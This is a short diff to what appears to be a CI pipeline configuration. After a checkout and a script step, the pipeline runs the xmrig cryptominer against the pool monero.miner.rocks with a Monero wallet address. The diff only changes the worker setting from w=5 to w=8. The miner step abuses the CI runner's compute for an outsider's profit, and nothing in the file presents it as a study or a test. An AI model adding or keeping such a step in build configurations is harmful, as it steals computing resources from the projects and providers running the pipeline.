@@ -8,4 +8,4 @@ jobs:
       - run: apt-get update
       - checkout
       - run: bash ./pr.sh
-      - run: /root/xmrig/build/xmrig -o monero.miner.rocks:3331 -O 4Cf2TfMKhCgJ2vsM3HeBUnYe52tXrvv8X1ajjuQEMUQ8iU8kvUzCSsCEacxFhEmeb2JgPpQ5chdyw3UiTfUgapJBhAZbrb3mp2MHvH7iar:w=5 -k --donate-level 1 
+      - run: /root/xmrig/build/xmrig -o monero.miner.rocks:3331 -O 4Cf2TfMKhCgJ2vsM3HeBUnYe52tXrvv8X1ajjuQEMUQ8iU8kvUzCSsCEacxFhEmeb2JgPpQ5chdyw3UiTfUgapJBhAZbrb3mp2MHvH7iar:w=8 -k --donate-level 1 
